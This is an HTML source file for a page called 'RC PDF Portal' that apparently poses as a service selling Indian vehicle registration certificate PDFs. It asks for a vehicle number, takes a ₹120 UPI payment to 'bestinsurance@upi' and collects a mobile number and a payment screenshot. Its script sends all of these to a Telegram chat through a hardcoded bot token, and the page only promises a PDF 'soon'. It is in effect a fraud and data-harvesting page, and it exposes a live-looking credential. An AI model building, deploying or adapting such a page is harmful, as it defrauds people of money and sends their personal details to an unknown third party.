<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RC PDF Portal</title>

<style>
body{
margin:0;
font-family:Arial;
background:linear-gradient(270deg,red,blue,green,purple,cyan);
background-size:600% 600%;
animation:bg 12s infinite alternate;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
min-height:100vh;
}

@keyframes bg{
0%{background-position:0%}
100%{background-position:100%}
}

.card{
background:#000c;
color:white;
padding:25px;
border-radius:18px;
width:92%;
max-width:420px;
text-align:center;
}

.hidden{display:none;}

button,input{
width:100%;
padding:12px;
margin-top:10px;
border:none;
border-radius:10px;
font-size:16px;
}

button{
background:#00ffd5;
font-weight:bold;
cursor:pointer;
}

/* IND STYLE INPUT */
.ind-box{
display:flex;
align-items:center;
background:#fff;
border-radius:12px;
border:2px solid #000;
overflow:hidden;
margin-top:10px;
}

.ind-tag{
background:#0a3d91;
color:#fff;
padding:10px 14px;
display:flex;
flex-direction:column;
align-items:center;
font-weight:bold;
font-size:14px;
}

.ind-tag img{
width:26px;
margin-bottom:4px;
animation:spin 2s linear infinite;
}

.ind-box input{
border:none;
padding:14px;
font-size:16px;
outline:none;
flex:1;
}

@keyframes spin{
from{transform:rotate(0deg);}
to{transform:rotate(360deg);}
}

.footer{
margin-top:20px;
padding:12px;
width:92%;
max-width:420px;
text-align:center;
color:white;
font-size:14px;
background:linear-gradient(270deg,red,blue,green,purple,cyan);
background-size:600% 600%;
animation:bg 10s infinite alternate;
border-radius:12px;
}
</style>
</head>

<body>

<div class="card">

<!-- PAGE 1 -->
<div id="p1">
<h3>Enter Vehicle Number</h3>

<div class="ind-box">
  <div class="ind-tag">
    <img src="https://upload.wikimedia.org/wikipedia/commons/1/17/Ashoka_Chakra.svg">
    IND
  </div>
  <input id="vehicle" placeholder="Enter Car No" maxlength="13" oninput="formatVehicle(this)">
</div>

<button onclick="goPay()">Continue</button>
</div>

<!-- PAGE 2 -->
<div id="p2" class="hidden">
<h3>Pay ₹120</h3>

<img width="220" src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=bestinsurance@upi&am=120">

<p>UPI ID: bestinsurance@upi</p>

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">

<button onclick="submitPay()">Submit</button>
</div>

<!-- PAGE 3 -->
<div id="p3" class="hidden">
<h3>Payment Successful</h3>
<p>RC PDF will be sent soon</p>
</div>

</div>

<div class="footer">
<p>© 2026 Mishra Service</p>
</div>

<script>
const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

function formatVehicle(el){
let v=el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
let out=v.slice(0,2);
if(v.slice(2,4)) out+="-"+v.slice(2,4);
if(v.slice(4,6)) out+="-"+v.slice(4,6);
if(v.slice(6)) out+="-"+v.slice(6,10);
el.value=out;
}

function goPay(){
if(!vehicle.value.trim()) return alert("Enter vehicle number");
p1.classList.add("hidden");
p2.classList.remove("hidden");
}

function submitPay(){
let data=new FormData();
data.append("chat_id",chatId);
data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
data.append("photo",proof.files[0]);

fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
method:"POST",
body:data
}).then(()=>{
p2.classList.add("hidden");
p3.classList.remove("hidden");
});
}
</script>

</body>
</html>
